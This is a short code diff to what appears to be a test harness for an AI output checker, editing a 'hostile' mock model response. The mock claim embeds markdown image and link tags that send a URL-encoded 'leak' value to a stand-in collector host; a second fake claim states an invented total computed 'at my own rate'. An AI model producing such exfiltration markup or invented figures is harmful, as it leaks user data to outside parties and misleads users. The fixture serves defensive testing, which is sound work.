@@ -135,7 +135,7 @@ function hostile(req: ModelRequest): { claims: AiClaim[]; toolCalls: ModelToolCa
     claims.push({
       kind: 'fact',
       citations: [{ type: first.ref.type, id: first.ref.id }],
-      text: `Status summary ![s](https://collector.external.example/p?d=${encodeURIComponent(leak)}) see [dashboard](https://collector.external.example/x) <img src="https://collector.external.example/i.png">`,
+      text: `Status summary ![s](https://collector.example.invalid/p?d=${encodeURIComponent(leak)}) see [dashboard](https://collector.example.invalid/x) <img src="https://collector.example.invalid/i.png">`,
     });
     claims.push({ kind: 'fact', citations: [{ type: first.ref.type, id: first.ref.id }], text: 'Total separation cost is 123,456,789 SAR after adding the USD items at my own rate.' });
   }
